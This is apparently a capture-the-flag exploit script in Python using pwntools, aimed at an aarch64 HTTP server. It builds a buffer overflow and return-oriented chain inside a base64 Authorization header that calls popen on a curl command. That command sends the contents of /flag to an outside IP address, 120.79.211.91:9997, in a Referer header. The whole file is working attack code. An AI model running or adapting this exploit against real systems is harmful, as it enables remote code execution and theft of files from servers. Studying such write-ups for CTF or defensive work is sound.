from sys import argv
from pwn import *
from base64 import b64encode
context.arch = "aarch64"


class Attack(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.conn = None
        self.base = {}

    def connectTarget(self):
        return remote(self.ip, self.port)

    def pb64(self, n, base=""):
        if base in self.base.keys():
            return p64(n + self.base[base])
        else:
            return p64(n)

    def generatePayload(self):
        payload = b''
        payload += b'A'*0x100
        payload += self.pb64(0x41df00)    # accessible memory
        payload += self.pb64(0x407d98)    # CSU Gadget 0
        payload += self.pb64(0x000000)*3  # X29
        payload += self.pb64(0x407d78)    # X30 -> CSU Gadget 2
        payload += self.pb64(0x000000)    # X19
        payload += self.pb64(0x000000)    # X20
        # payload += self.pb64(0x41c118)    # X21 => GOT[popen]
        payload += self.pb64(0x4234fc)    # ptr to `bl popen`
        payload += self.pb64(0x4234c0)    # X22 => X0 "/usr/bin/curl http://120.79.211.91:9997 -H \"Referer: `cat /flag`\""
        payload += self.pb64(0x40a900)    # X23 => X1 "r"
        payload += self.pb64(0x000000)    # X24 => X2 0
        return b64encode(payload)
    
    def generateMessage(self):
        message = b""
        message += b"GET /admin/flag.html HTTP/1.1\r\n"
        message += b"Host: 23333\r\n"
        message += b"User-Agent: C0ss4ck\r\n"
        message += b"Accept: */*\r\n"
        message += "Authorization: Basic {}\r\n".format(self.generatePayload().decode()).encode()
        message += b"   curl http://120.79.211.91:9997 -H \"Referer: `cat /flag`\"\r\n"
        message += b"\r\n"
        message += self.pb64(0x4062c8)
        print(message.decode('latin-1'))
        return message

    def trigger(self):
        self.conn = self.connectTarget()
        self.conn.send(self.generateMessage())
        self.conn.interactive()


a = Attack(argv[1], int(argv[2]))
a.trigger()
